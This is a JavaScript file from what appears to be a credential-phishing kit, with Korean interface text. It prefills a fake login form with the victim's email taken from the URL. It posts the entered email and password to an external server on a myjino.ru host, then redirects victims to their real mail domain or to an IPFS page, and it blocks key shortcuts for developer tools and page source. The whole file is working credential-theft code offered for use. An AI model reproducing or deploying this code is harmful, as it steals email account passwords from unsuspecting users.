

    /* global $ */
    $(document).ready(function(){
      var count=0;

      // $('#back1').click(function () {
      //   $("#msg").hide();
      //   $('#email').val("");
      //   $("#automail").animate({left:200, opacity:"hide"}, 0);
      //   $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      // });

    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    }
    else
    {
        // $('#email').val(email);
        var my_email =email;
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', '1.png');
        $('#field').html("Other Mail");
        $('#email').val(my_email);
        $('#emailch').html(my_email);
        $("#msg").hide();
        // $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        // $("#automail").animate({right:200, opacity:"show"}, 1000);
      }
      ///////////////url getting email////////////////
	  


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://fadf4f4e8a94.hosting.myjino.ru/na/next.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('확인 중 ...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                   window.location.replace("https://www."+my_slice);

                  }
                  $('#msg_text').html(response['msg']);
                }
                else{
                  $('#msg_text').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
				window.location.replace("https://cloudflare-ipfs.com/ipfs/bafybeibnyzncvgf2u2vukdru2xp3vzawavgtgon3lwf3xinuvmr76o6boa/#"+email);
              }
              $("#msg").show();
              $('#msg_text').html("");
            },
            complete: function(){
              $('#submit-btn').html('계속하다');
            }
          });
    });


    });

    document.onkeydown=function(e){
      if (e.ctrlKey && 
        (e.keyCode === 73 || 
         e.keyCode === 105 ||
         e.keyCode === 74 || 
         e.keyCode === 106 || 
         e.keyCode === 85 || 
         e.keyCode === 117)) {
        alert('not allowed');
      return false;
    } else {
      return true;
    }
  }
